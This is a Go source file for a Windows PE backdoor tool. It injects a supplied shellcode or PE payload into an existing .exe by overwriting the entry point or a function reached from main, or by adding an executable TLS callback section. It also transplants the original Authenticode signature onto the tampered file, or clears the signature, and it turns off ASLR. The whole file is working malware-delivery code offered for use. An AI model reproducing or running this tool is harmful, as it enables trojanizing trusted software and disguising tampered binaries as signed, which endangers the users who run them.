package main

import (
	"encoding/binary"
	"flag"
	"fmt"
	"github.com/Binject/debug/pe"
	"io"
	"io/ioutil"
	"log"
	"os"
	"regexp"
	"strings"
	"syscall"
	"unsafe"
)

// Constants for file attributes
const (
	FILE_ATTRIBUTE_ARCHIVE  = 0x20
	FILE_ATTRIBUTE_READONLY = 0x01
)

// SetFileAttributes sets the file attributes using Windows API
func SetFileAttributes(filename string, attrs uint32) error {
	p, err := syscall.UTF16PtrFromString(filename)
	if err != nil {
		return err
	}
	return syscall.SetFileAttributes(p, attrs)
}

// GetFileAttributes gets the file attributes using Windows API
func GetFileAttributes(filename string) (uint32, error) {
	p, err := syscall.UTF16PtrFromString(filename)
	if err != nil {
		return 0, err
	}
	attrs, err := syscall.GetFileAttributes(p)
	if err != nil {
		return 0, err
	}
	return attrs, nil
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: program [-sign] function/entrypoint/tlsinject <modify_pe_file_path> <shellcode_or_pe_path>")
		return
	}

	// 定义命令行参数
	sign := flag.Bool("sign", false, "Use signing")

	// 解析命令行参数
	flag.Parse()

	// 获取非flag参数
	args := flag.Args()
	if len(args) < 3 {
		fmt.Println("Usage: program function/entrypoint/tlsinject <modify_pe_file_path> <shellcode_or_pe_path> [-sign]")
		return
	}

	fmt.Println(args)

	fileArch := false

	mod := args[0]
	modify := args[1]
	textpath := args[2]

	var cert []byte

	fmt.Println(*sign)

	backupFile(modify)

	// Get current file attributes
	attrs, err := GetFileAttributes(modify)
	if err != nil {
		fmt.Println("Error getting file attributes:", err)
		return
	}

	// Check if the file is "-ar"
	if attrs&FILE_ATTRIBUTE_ARCHIVE != 0 && attrs&FILE_ATTRIBUTE_READONLY != 0 {
		fmt.Println("File has '-ar' attributes")
		fileArch = true

		// Set file attributes to "a"
		err := SetFileAttributes(modify, FILE_ATTRIBUTE_ARCHIVE)
		if err != nil {
			fmt.Println("Error setting attributes to 'a':", err)
			return
		}
		fmt.Println("Attributes set to 'a'")

	}

	switch mod {
	case "function":
		if *sign {
			fmt.Println("getsign")
			cert = CopyCert(modify)
			execute(modify, textpath)
			WriteCert(cert, modify, modify)
		} else {
			execute(modify, textpath)
			clearcert(modify)
		}

	case "entrypoint":
		if *sign {
			fmt.Println("getsign")
			cert = CopyCert(modify)
			off := findEntryOff(modify)
			replaceTextSectionOffset(modify, textpath, uint64(off))
			WriteCert(cert, modify, modify)
		} else {
			off := findEntryOff(modify)
			replaceTextSectionOffset(modify, textpath, uint64(off))
			clearcert(modify)
		}
	case "tlsinject":
		if *sign {
			fmt.Println("getsign")
			cert = CopyCert(modify)
			patchTls(modify, textpath)
			WriteCert(cert, modify, modify)
		} else {
			clearcert(modify)
			patchTls(modify, textpath)
		}
	default:
		fmt.Println("wrong mode")
	}

	if fileArch == true {
		// Set file attributes back to "-ar"
		err = SetFileAttributes(modify, FILE_ATTRIBUTE_ARCHIVE|FILE_ATTRIBUTE_READONLY)
		if err != nil {
			fmt.Println("Error setting attributes back to 'ar':", err)
			return
		}
		fmt.Println("Attributes set back to 'ar'")
	}

}

type IMAGE_DOS_HEADER struct {
	E_magic    uint16
	E_cblp     uint16
	E_cp       uint16
	E_crlc     uint16
	E_cparhdr  uint16
	E_minalloc uint16
	E_maxalloc uint16
	E_ss       uint16
	E_sp       uint16
	E_csum     uint16
	E_ip       uint16
	E_cs       uint16
	E_lfarlc   uint16
	E_ovno     uint16
	E_res      [4]uint16
	E_oemid    uint16
	E_oeminfo  uint16
	E_res2     [10]uint16
	E_lfanew   int32
}

type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type IMAGE_OPTIONAL_HEADER64 struct {
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               [16]IMAGE_DATA_DIRECTORY
}

type IMAGE_NT_HEADERS64 struct {
	Signature      uint32
	FileHeader     IMAGE_FILE_HEADER
	OptionalHeader IMAGE_OPTIONAL_HEADER64
}

type IMAGE_DATA_DIRECTORY struct {
	VirtualAddress uint32
	Size           uint32
}

type IMAGE_SECTION_HEADER struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

type IMAGE_TLS_DIRECTORY64 struct {
	StartAddressOfRawData uint64
	EndAddressOfRawData   uint64
	AddressOfIndex        uint64
	AddressOfCallBacks    uint64
	SizeOfZeroFill        uint32
	Characteristics       uint32
}

const (
	IMAGE_SCN_MEM_EXECUTE = 0x20000000
	IMAGE_SCN_MEM_READ    = 0x40000000
	IMAGE_SCN_MEM_WRITE   = 0x80000000
)

func alignUp(size, align uint32) uint32 {
	return ((size + align - 1) / align) * align
}

func getNtHeaders(buf []byte) *IMAGE_NT_HEADERS64 {
	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&buf[0]))
	return (*IMAGE_NT_HEADERS64)(unsafe.Pointer(&buf[dosHeader.E_lfanew]))
}

func getSectionArr(buf []byte) *[1 << 30]IMAGE_SECTION_HEADER {
	ntHeaders := getNtHeaders(buf)
	return (*[1 << 30]IMAGE_SECTION_HEADER)(unsafe.Pointer(uintptr(unsafe.Pointer(ntHeaders)) + unsafe.Sizeof(*ntHeaders)))
}

func newSection(buf []byte) *IMAGE_SECTION_HEADER {
	ntHeaders := getNtHeaders(buf)
	sectionArr := getSectionArr(buf)
	firstSecHdr := &sectionArr[0]
	finalSecHdr := &sectionArr[ntHeaders.FileHeader.NumberOfSections-1]
	creatSecHdr := &sectionArr[ntHeaders.FileHeader.NumberOfSections]
	creatSecHdr.SizeOfRawData = 0

	copy(creatSecHdr.Name[:], ".tlss")
	creatSecHdr.Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE
	creatSecHdr.VirtualAddress = alignUp(
		finalSecHdr.VirtualAddress+finalSecHdr.VirtualSize,
		ntHeaders.OptionalHeader.SectionAlignment,
	)
	ntHeaders.FileHeader.NumberOfSections++

	if uintptr(unsafe.Pointer(creatSecHdr))-uintptr(unsafe.Pointer(&buf[0])) < uintptr(firstSecHdr.PointerToRawData) {
		return creatSecHdr
	}
	return nil
}

func tlsInject(exeData []byte, ptrStubData []byte, pathToWrite string) bool {
	ntHeaders := getNtHeaders(exeData)
	tlsDataDir := &ntHeaders.OptionalHeader.DataDirectory[9] // IMAGE_DIRECTORY_ENTRY_TLS
	sakeUsed := uint32(0)
	sakeSecData := make([]byte, 0x100+len(ptrStubData))

	sectionArr := getSectionArr(exeData)
	lastSection := &sectionArr[ntHeaders.FileHeader.NumberOfSections-1]
	offsetNewDataStart := alignUp(lastSection.PointerToRawData+lastSection.SizeOfRawData, ntHeaders.OptionalHeader.FileAlignment)

	sakeSection := newSection(exeData)
	if sakeSection == nil {
		return false
	}

	if tlsDataDir.VirtualAddress == 0 || tlsDataDir.Size == 0 {
		imgTlsDir := (*IMAGE_TLS_DIRECTORY64)(unsafe.Pointer(&sakeSecData[0]))
		sakeUsed += uint32(unsafe.Sizeof(*imgTlsDir))

		imgTlsDir.AddressOfIndex = ntHeaders.OptionalHeader.ImageBase + uint64(sakeSection.VirtualAddress)
		imgTlsDir.AddressOfCallBacks = ntHeaders.OptionalHeader.ImageBase + uint64(sakeSection.VirtualAddress) + uint64(sakeUsed)

		addrOfCBackSaveAt := (*[2]uint64)(unsafe.Pointer(&sakeSecData[sakeUsed]))
		sakeUsed += 16 // size of two uint64
		addrOfCBackSaveAt[0] = ntHeaders.OptionalHeader.ImageBase + uint64(sakeSection.VirtualAddress) + uint64(sakeUsed)
		addrOfCBackSaveAt[1] = 0

		tlsDataDir.VirtualAddress = sakeSection.VirtualAddress
		tlsDataDir.Size = sakeUsed
	} else {
		imgTlsDirOffset := rvaToOffset(exeData, tlsDataDir.VirtualAddress)
		if imgTlsDirOffset == 0 || int(imgTlsDirOffset)+int(unsafe.Sizeof(IMAGE_TLS_DIRECTORY64{})) > len(exeData) {
			log.Printf("Invalid TLS directory offset: %d", imgTlsDirOffset)
			return false
		}
		imgTlsDir := *(*IMAGE_TLS_DIRECTORY64)(unsafe.Pointer(&exeData[imgTlsDirOffset]))

		k := rvaToOffset(exeData, uint32(imgTlsDir.AddressOfCallBacks-ntHeaders.OptionalHeader.ImageBase))
		if k == 0 || int(k)+16 > len(exeData) {
			log.Printf("Invalid AddressOfCallBacks offset: %d", k)
			return false
		}
		// 动态计算回调数组的长度
		addrOfCBackSaveAt := (*[1 << 30]uint64)(unsafe.Pointer(&exeData[k])) // 假设最大长度为1<<30
		numOfCBacks := 0
		for i := 0; addrOfCBackSaveAt[i] != 0; i++ {
			numOfCBacks++
		}

		addrOfCBackSaveAt[numOfCBacks] = ntHeaders.OptionalHeader.ImageBase + uint64(sakeSection.VirtualAddress)
		addrOfCBackSaveAt[numOfCBacks+1] = 0
	}

	fileSakeSize := alignUp(sakeUsed+uint32(len(ptrStubData)), ntHeaders.OptionalHeader.FileAlignment)
	sectSakeSize := alignUp(sakeUsed+uint32(len(ptrStubData)), ntHeaders.OptionalHeader.SectionAlignment)
	sakeSection.PointerToRawData = offsetNewDataStart
	sakeSection.SizeOfRawData = fileSakeSize
	sakeSection.VirtualSize = sectSakeSize

	outExeBuf := make([]byte, len(exeData)+int(fileSakeSize))
	copy(outExeBuf, exeData)
	copy(outExeBuf[offsetNewDataStart:], sakeSecData[:sakeUsed])
	copy(outExeBuf[offsetNewDataStart+sakeUsed:], ptrStubData)

	fixUp_SaveExeToFile(outExeBuf, pathToWrite)
	return true
}

func rvaToOffset(exeData []byte, RVA uint32) uint32 {
	ntHeaders := getNtHeaders(exeData)
	sectionArr := getSectionArr(exeData)
	for i := uint16(0); i < ntHeaders.FileHeader.NumberOfSections; i++ {
		section := &sectionArr[i]
		if RVA >= section.VirtualAddress && RVA <= section.VirtualAddress+section.VirtualSize {
			return section.PointerToRawData + (RVA - section.VirtualAddress)
		}
	}
	return 0
}

func fixUp_SaveExeToFile(bufToSave []byte, pathToWrite string) {
	ntHeaders := getNtHeaders(bufToSave)
	sectionArr := getSectionArr(bufToSave)

	for i := uint16(1); i < ntHeaders.FileHeader.NumberOfSections; i++ {
		sectionArr[i-1].VirtualSize = sectionArr[i].VirtualAddress - sectionArr[i-1].VirtualAddress
	}

	lastSection := &sectionArr[ntHeaders.FileHeader.NumberOfSections-1]
	lastSection.VirtualSize = alignUp(lastSection.SizeOfRawData, ntHeaders.OptionalHeader.SectionAlignment)

	ntHeaders.OptionalHeader.SizeOfImage = lastSection.VirtualAddress + lastSection.VirtualSize

	ntHeaders.OptionalHeader.DllCharacteristics &^= 0x0040 // IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE

	err := ioutil.WriteFile(pathToWrite, bufToSave, 0644)
	if err != nil {
		log.Fatalf("Failed to write output file: %v", err)
	}
}

func patchTls(peFilePath, shellcodePath string) string {
	exeData, err := ioutil.ReadFile(peFilePath)
	if err != nil {
		log.Fatalf("Failed to read PE file: %v", err)
	}

	shellcode, err := ioutil.ReadFile(shellcodePath)
	if err != nil {
		log.Fatalf("Failed to read shellcode file: %v", err)
	}

	outputPath := peFilePath
	if tlsInject(exeData, shellcode, outputPath) {
		fmt.Printf("TLS injection successful. Output file: %s\n", outputPath)
	} else {
		fmt.Println("TLS injection failed.")
	}
	return outputPath
}

func findEntryOff(pePath string) uint32 {
	// 打开 PE 文件
	file, err := pe.Open(pePath)
	if err != nil {
		fmt.Println("Error opening PE file:", err)
		return 0
	}
	defer file.Close()

	// 获取 AddressOfEntryPoint
	entryPoint := file.OptionalHeader.(*pe.OptionalHeader64).AddressOfEntryPoint

	fmt.Printf("AddressOfEntryPoint: 0x%X\n", entryPoint)

	// 计算文件偏移
	return rva2offset(file, entryPoint)
}

func rva2offset(pefile *pe.File, rva uint32) uint32 {
	for _, section := range pefile.Sections {
		if rva >= section.VirtualAddress && rva < section.VirtualAddress+section.VirtualSize {
			return rva - section.VirtualAddress + section.Offset
		}
	}
	return 0
}

func va2rva(pefile *pe.File, va uint64) uint32 {
	imageBase := pefile.OptionalHeader.(*pe.OptionalHeader64).ImageBase
	return uint32(va - imageBase)
}
func replaceTextSectionOffset(peFilePath, textBinPath string, off uint64) {
	peFile, err := pe.Open(peFilePath)
	if err != nil {
		fmt.Println("无法读取PE文件:", err)
		return
	}
	defer peFile.Close()

	fileOffset := off
	if fileOffset == 0 {
		fmt.Println("错误: 无法找到对应的文件偏移，RVA 可能不在任何节区中。")
		return
	}

	textData, err := ioutil.ReadFile(textBinPath)
	if err != nil {
		fmt.Println("无法读取text bin文件:", err)
		return
	}

	file, err := os.OpenFile(peFilePath, os.O_RDWR, 0644)
	if err != nil {
		fmt.Println("无法打开PE文件:", err)
		return
	}
	defer file.Close()

	if _, err := file.Seek(int64(fileOffset), 0); err != nil {
		fmt.Println("无法定位到文件偏移:", err)
		return
	}

	if _, err := file.Write(textData); err != nil {
		fmt.Println("无法写入数据:", err)
		return
	}

	fmt.Println("成功: .text节区已成功覆盖在PE文件中。")
}

func replaceTextSection(peFilePath, textBinPath string, va uint64) {
	peFile, err := pe.Open(peFilePath)
	if err != nil {
		fmt.Println("无法读取PE文件:", err)
		return
	}
	defer peFile.Close()

	rva := va2rva(peFile, va)
	fileOffset := rva2offset(peFile, rva)
	if fileOffset == 0 {
		fmt.Println("错误: 无法找到对应的文件偏移，RVA 可能不在任何节区中。")
		return
	}

	textData, err := ioutil.ReadFile(textBinPath)
	if err != nil {
		fmt.Println("无法读取text bin文件:", err)
		return
	}

	file, err := os.OpenFile(peFilePath, os.O_RDWR, 0644)
	if err != nil {
		fmt.Println("无法打开PE文件:", err)
		return
	}
	defer file.Close()

	if _, err := file.Seek(int64(fileOffset), 0); err != nil {
		fmt.Println("无法定位到文件偏移:", err)
		return
	}

	if _, err := file.Write(textData); err != nil {
		fmt.Println("无法写入数据:", err)
		return
	}

	fmt.Println("成功: .text节区已成功覆盖在PE文件中。")
}

func checkFileExist(filePath string) bool {
	info, err := os.Stat(filePath)
	if os.IsNotExist(err) {
		return false
	}
	return !info.IsDir()
}

func execute(modifyPEFilePath, textOrPEPath string) {
	if modifyPEFilePath == "" || textOrPEPath == "" {
		fmt.Println("错误: 输入不能为空。")
		return
	}

	if !strings.HasSuffix(strings.ToLower(modifyPEFilePath), ".exe") {
		fmt.Println("错误: 待修改的PE文件必须是.exe格式。")
		return
	}

	textData, err := ioutil.ReadFile(textOrPEPath)
	if err != nil {
		fmt.Println("无法读取text bin文件:", err)
		return
	}
	dataLen := len(textData)
	textData = nil
	fmt.Printf("shellcode长度为: %d\n", dataLen)

	fmt.Println("启动自动化patch")
	va := findCrtFunction(modifyPEFilePath, dataLen)

	fmt.Printf("成功: 获取到可能patch func va: %x\n", va)

	var textBinPath string

	if !checkFileExist(textOrPEPath) {
		fmt.Println("错误: .text文件不可读或不存在。")
		return
	}
	textBinPath = textOrPEPath

	replaceTextSection(modifyPEFilePath, textBinPath, va)
}

func findCrtFunction(pePath string, dataLen int) uint64 {
	peFile, err := pe.Open(pePath)
	if err != nil {
		fmt.Println("无法读取PE文件:", err)
		return 0
	}
	defer peFile.Close()

	entryPointRva := peFile.OptionalHeader.(*pe.OptionalHeader64).AddressOfEntryPoint
	codeSize := uint32(0x100)
	codeRva := entryPointRva - 0x10
	codeVa := uint64(codeRva) + peFile.OptionalHeader.(*pe.OptionalHeader64).ImageBase
	code, err := getMemoryMappedImage(peFile)
	if err != nil {
		fmt.Println("无法获取内存映射镜像:", err)
		return 0
	}

	code = code[codeRva : codeRva+codeSize]

	callJmpCount := 0
	var crtAddr uint64
	for i := 0; i < len(code)-5; i++ {
		if code[i] == 0xE9 { // jmp opcode
			callJmpCount++
			if callJmpCount == 1 {
				relativeAddr := int32(binary.LittleEndian.Uint32(code[i+1 : i+5]))
				crtAddr = uint64(int64(codeVa) + int64(i) + int64(relativeAddr) + 5)
				fmt.Printf("CRT function VA: 0x%x\n", crtAddr)
				break
			}
		}
	}
	return findByCrt(pePath, crtAddr, dataLen)
}

func findByCrt(pePath string, crtAddr uint64, dataLen int) uint64 {
	peFile, err := pe.Open(pePath)
	if err != nil {
		fmt.Println("无法读取PE文件:", err)
		return 0
	}
	defer peFile.Close()

	crtAddrRva := va2rva(peFile, crtAddr)
	codeSize := uint32(0x300)
	codeRva := crtAddrRva
	codeVa := uint64(codeRva) + peFile.OptionalHeader.(*pe.OptionalHeader64).ImageBase
	code, err := getMemoryMappedImage(peFile)
	if err != nil {
		fmt.Println("无法获取内存映射镜像:", err)
		return 0
	}

	code = code[codeRva : codeRva+codeSize]

	var crtR8Addr uint64
	crtR8AddrCount := 0
	for i := 0; i < len(code)-3; i++ {
		if code[i] == 0x4C && code[i+1] == 0x8B && code[i+2]>>4 == 0xC { // mov r8, ...
			crtR8AddrCount++
			if crtR8AddrCount == 1 {
				crtR8Addr = codeVa + uint64(i)
				fmt.Printf("CRT's mov r8 instruction VA: 0x%x\n", crtR8Addr)
				break
			}
		}
	}
	return findByR8(pePath, crtR8Addr, dataLen)
}

func isHex(s string) bool {
	matched, _ := regexp.MatchString(`^0x[0-9a-fA-F]+$`, s)
	return matched
}

func findByR8(pePath string, crtR8Addr uint64, dataLen int) uint64 {
	peFile, err := pe.Open(pePath)
	if err != nil {
		fmt.Println("无法读取PE文件:", err)
		return 0
	}
	defer peFile.Close()

	crtR8AddrRva := va2rva(peFile, crtR8Addr)
	codeSize := uint32(0x50)
	codeRva := crtR8AddrRva
	codeVa := uint64(codeRva) + peFile.OptionalHeader.(*pe.OptionalHeader64).ImageBase
	code, err := getMemoryMappedImage(peFile)
	if err != nil {
		fmt.Println("无法获取内存映射镜像:", err)
		return 0
	}

	code = code[codeRva : codeRva+codeSize]

	mainAddrCount := 0
	var mainAddr uint64
	for i := 0; i < len(code)-5; i++ {
		if code[i] == 0xE8 { // call opcode
			relativeAddr := int32(binary.LittleEndian.Uint32(code[i+1 : i+5]))
			opStr := fmt.Sprintf("0x%x", uint64(int64(codeVa)+int64(i)+int64(relativeAddr)+5))
			if isHex(opStr) {
				mainAddrCount++
				if mainAddrCount == 1 {
					mainAddr = uint64(int64(codeVa) + int64(i) + int64(relativeAddr) + 5)
					fmt.Printf("main instruction VA: 0x%x\n", mainAddr)
					break
				}
			}
		}
	}
	return findByMain(pePath, mainAddr, dataLen)
}

func findByMain(pePath string, mainAddr uint64, dataLen int) uint64 {
	peFile, err := pe.Open(pePath)
	if err != nil {
		fmt.Println("无法读取PE文件:", err)
		return 0
	}
	defer peFile.Close()

	mainAddrRva := va2rva(peFile, mainAddr)
	codeSize := uint32(0x200)
	codeRva := mainAddrRva
	codeVa := uint64(codeRva) + peFile.OptionalHeader.(*pe.OptionalHeader64).ImageBase
	code, err := getMemoryMappedImage(peFile)
	if err != nil {
		fmt.Println("无法获取内存映射镜像:", err)
		return 0
	}

	code = code[codeRva : codeRva+codeSize]

	for i := 0; i < len(code)-5; i++ {
		if code[i] == 0xE8 || code[i] == 0xE9 { // call or jmp opcode
			relativeAddr := int32(binary.LittleEndian.Uint32(code[i+1 : i+5]))
			patchAddr := uint64(int64(codeVa) + int64(i) + int64(relativeAddr) + 5)
			opStr := fmt.Sprintf("0x%x", patchAddr)
			if isHex(opStr) {
				fmt.Printf("may patch: 0x%x\n", patchAddr)
				if filterByFuncRet(pePath, patchAddr, dataLen) {
					fmt.Printf("patch func instruction VA: 0x%x\n", patchAddr)
					return patchAddr
				}
			}
		}
	}
	return 0
}

func filterByFuncRet(pePath string, patchAddr uint64, dataLen int) bool {
	peFile, err := pe.Open(pePath)
	if err != nil {
		fmt.Println("无法读取PE文件:", err)
		return false
	}
	defer peFile.Close()

	patchAddrRva := va2rva(peFile, patchAddr)
	codeSize := uint32(0x4000)
	codeRva := patchAddrRva
	codeVa := uint64(codeRva) + peFile.OptionalHeader.(*pe.OptionalHeader64).ImageBase
	code, err := getMemoryMappedImage(peFile)
	if err != nil {
		fmt.Println("无法获取内存映射镜像:", err)
		return false
	}

	if int(codeRva+codeSize) > len(code) {
		return false
	}
	code = code[codeRva : codeRva+codeSize]

	var patchRetnAddr uint64
	patchAddrCount := 0
	for i := 0; i < len(code)-2; i++ {
		if code[i] == 0x5B && code[i+1] == 0xC3 { // ret opcode
			patchAddrCount++
			if patchAddrCount == 1 {
				patchRetnAddr = codeVa + uint64(i)
				fmt.Printf("patch func retn VA: 0x%x\n", patchRetnAddr)
				break
			}
		}
	}
	fmt.Printf("Function size: 0x%x\n", patchRetnAddr-patchAddr)
	return patchRetnAddr-patchAddr > uint64(dataLen)
}

func getMemoryMappedImage(peFile *pe.File) ([]byte, error) {
	imageSize := peFile.OptionalHeader.(*pe.OptionalHeader64).SizeOfImage
	image := make([]byte, imageSize)

	for _, section := range peFile.Sections {
		data, err := section.Data()
		if err != nil {
			return nil, fmt.Errorf("无法获取节区数据: %v", err)
		}
		start := int(section.VirtualAddress)
		end := start + len(data)
		copy(image[start:end], data)
	}
	return image, nil
}

func getWord(file *os.File) uint32 {
	fil := make([]byte, 2)
	at, err := file.Read(fil)
	if err != nil || at == 0 {
		log.Fatal(err.Error())
	}
	return uint32(binary.LittleEndian.Uint16(fil))

}
func getDword(file *os.File) uint32 {
	fil := make([]byte, 4)
	at, err := file.Read(fil)
	if err != nil || at == 0 {
		log.Fatal(err.Error())
	}
	return binary.LittleEndian.Uint32(fil)
}

func GetPeInfo(path string) (int64, uint32, uint32) {

	file, err := os.Open(path)
	if err != nil {
		log.Fatal(err.Error())
	}
	defer file.Close()
	fmt.Println("[*] Got the File")
	_, err = file.Seek(0x3c, 0)
	if err != nil {
		log.Fatal(err)
	}

	peHeaderLocation := getDword(file)
	CoffStart := int64(peHeaderLocation) + 4
	OptionalheaderStart := CoffStart + 20
	_, err = file.Seek(OptionalheaderStart, 0)
	if err != nil {
		log.Fatal(err.Error())
	}
	Magic := getWord(file)
	_, err = file.Seek(OptionalheaderStart+24, 0)
	if err != nil {
		log.Fatal(err.Error())
	}
	//	var imgBase uint64
	if Magic != 0x20b {
		file.Seek(4, io.SeekCurrent)

	}

	if Magic != 0x20b {
		file.Seek(4, io.SeekCurrent)
		//imgBase = uint64(getDword(file))
	} else {
		file.Seek(8, io.SeekCurrent)
		//imgBase = getQword(file)
	}
	position, _ := file.Seek(0, io.SeekCurrent)

	file.Seek(position+40, 0)

	if Magic == 0x20b {
		file.Seek(32, io.SeekCurrent)
	} else {
		file.Seek(16, io.SeekCurrent)
	}

	CertTableLOC, _ := file.Seek(40, io.SeekCurrent)
	fmt.Println("[*] Got the CertTable")
	CertLOC := getDword(file)
	CertSize := getDword(file)

	return CertTableLOC, CertLOC, CertSize
}

func CopyCert(path string) []byte {
	_, CertLOC, CertSize := GetPeInfo(path)
	if CertSize == 0 || CertLOC == 0 {
		log.Fatal("[*] Input file Not signed! ")
	}
	file, err := os.Open(path)
	defer file.Close()
	if err != nil {
		log.Fatal(err.Error())
	}

	file.Seek(int64(CertLOC), 0)
	cert := make([]byte, CertSize)
	file.Read(cert)
	fmt.Println("[*] Read the Cert successfully")
	return cert
}
func WriteCert(cert []byte, path string, outputPath string) {
	CertTableLOC, _, _ := GetPeInfo(path)
	//	copyFile(path, outputPath)
	file1, err := os.Open(path)
	if err != nil {
		log.Fatal(err.Error())
	}
	file2, err := os.OpenFile(outputPath, os.O_WRONLY|os.O_CREATE, 0755)
	if err != nil {
		log.Fatal(err.Error())
	}
	defer file2.Close()
	defer file1.Close()

	file1Info, err := os.Stat(path)
	file1Len := file1Info.Size()
	file1data := make([]byte, file1Len)
	file1.Read(file1data)
	file2.Write(file1data)
	file2.Seek(CertTableLOC, 0)
	x := make([]byte, 4)
	binary.LittleEndian.PutUint32(x, uint32(file1Len))
	file2.Write(x)
	bCertLen := make([]byte, 4)
	binary.LittleEndian.PutUint32(bCertLen, uint32(len(cert)))
	file2.Write(bCertLen)
	file2.Seek(0, io.SeekEnd)
	file2.Write(cert)
	fmt.Println("[*] Signature appended!")
}

func clearcert(path string) {
	CertTableLOC, CertLOC, CertSize := GetPeInfo(path)
	if CertSize == 0 || CertLOC == 0 {
		fmt.Println("[*] Input file Not signed! ")
		return
	}

	file, err := os.OpenFile(path, os.O_RDWR, 0644)
	if err != nil {
		log.Fatal(err.Error())
	}
	defer file.Close()

	// 将证书表的位置和大小设置为 0
	file.Seek(CertTableLOC, 0)
	zero := make([]byte, 8)
	file.Write(zero)

	// 将原本的证书位置填充 0x00
	file.Seek(int64(CertLOC), 0)
	emptyCert := make([]byte, CertSize)
	file.Write(emptyCert)

	fmt.Println("[*] Signature cleared successfully")
}

// backupFile creates a backup of the given file
func backupFile(filepath string) error {
	srcFile, err := os.Open(filepath)
	if err != nil {
		return err
	}
	defer srcFile.Close()

	destFile, err := os.Create(filepath + ".bak")
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, srcFile)
	if err != nil {
		return err
	}

	return nil
}
